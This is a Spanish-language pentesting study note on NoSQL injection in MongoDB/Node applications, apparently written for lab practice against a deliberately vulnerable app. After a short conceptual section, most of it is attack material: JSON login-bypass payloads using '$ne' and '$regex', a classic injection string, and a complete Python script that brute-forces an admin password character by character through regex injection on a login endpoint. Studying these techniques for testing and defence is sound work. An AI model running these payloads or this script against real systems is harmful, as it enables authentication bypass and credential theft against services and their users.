# Inyecciones NoSQL

Tags: #NoSQLI #OWASP #Explotacion #MongoDB  #Node 

Las **inyecciones NoSQL** son vulnerabilidades que afectan aplicaciones que usan bases de datos **NoSQL** (ej. **MongoDB, Cassandra, CouchDB**).  
Ocurren cuando los datos de usuario se insertan en las consultas sin validación ni sanitización, permitiendo que el atacante manipule la consulta.
### Funcionamiento

- Similar a una **SQL Injection**, pero aplicado a **documentos** en lugar de tablas relacionales.
- El atacante envía datos maliciosos en campos de entrada → la aplicación construye dinámicamente la consulta → la base de datos ejecuta acciones no previstas.
### Riesgos

- **Exfiltración de datos sensibles**.
- **Bypass de autenticación** (ej. manipulación de login con `{ "$ne": null }`).
- **Modificación o borrado** de registros.
- Acceso a funciones internas de la base de datos.
### Diferencias con SQLi

- **SQLi** → explota consultas en **bases relacionales** (tablas).
- **NoSQLi** → explota consultas en **bases documentales** u orientadas a objetos.

A continuación, se proporciona el enlace al proyecto de Github para poner en práctica esta vulnerabilidad:

-   [Vulnerable Node APP](https://github.com/Charlie-belmer/vulnerable-node-app)
* [PayloasAllTheThings-NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
* [Hacktricks-Mongo-NoSQLI](https://book.hacktricks.xyz/pentesting-web/nosql-injection#sql-mongo)

```bash
❯ ' || '1'=='1       # Inyección clásica 
```

## Inyecciones NoSQL

```bash 
Recomendaciones:

- Interceptar las peticiones con 'BurpSuite'
- Petición por 'POST'
- Tramitar la data en 'Json' y cambiar el 'Content Type: application/json' a veces es necesario para que funcione la inyección 
```

```bash
# Petición original 

{                                    
	"username":"admin",
	"password":"admin"
}
```
## Payloads

```bash
{                             # Probar el NoEqual = $ne
	"username":"admin",
	"password":{
		"$ne":"admin"
	}
}
```

```bash
{                             # Probar el NoEqual = $ne
	"username":{
		"$ne":"omar"
	},
	"password":{
		"$ne":"admin"
	}
}
```

```bash
{                # Regex donde el usuario (^a = empieza por 'a'), con passwd correcta
 	"username":{
		"$regex":"^a"
	},
	"password":"admin"
}
```

```bash
{                 # Regex donde el usuario (^a = empieza por 'a')
 	"username":{
		"$regex":"^a"
	},
	"password":{
		"$ne":"admin"
	}
}
```

```bash
{                 # Conocer la longitud, la cual si es <= a la original será correcta
	"username":"admin",
	"password":{
		"$regex":".{24}"
	}
}
```

## Conocer password de un usuario valido 

```python 
#!/usr/bin/python3
from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits    

def makeNoSQLI():
	password = ""
	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando fuerza bruta")
	time.sleep(2)
	p2 = log.progress("Password")
	
	for position in range(0, 100):
		for character in characters:
			post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password, character)
			p1.status(post_data)
			headers = {'Content-Type': 'application/json'}
			r = requests.post(main_url, headers=headers, data=post_data)
			if "Logged in as user" in r.text:      # Error que muestra la web 
				password += character
				p2.status(password)
				break 
				
if __name__ == '__main__':
	makeNoSQLI()
```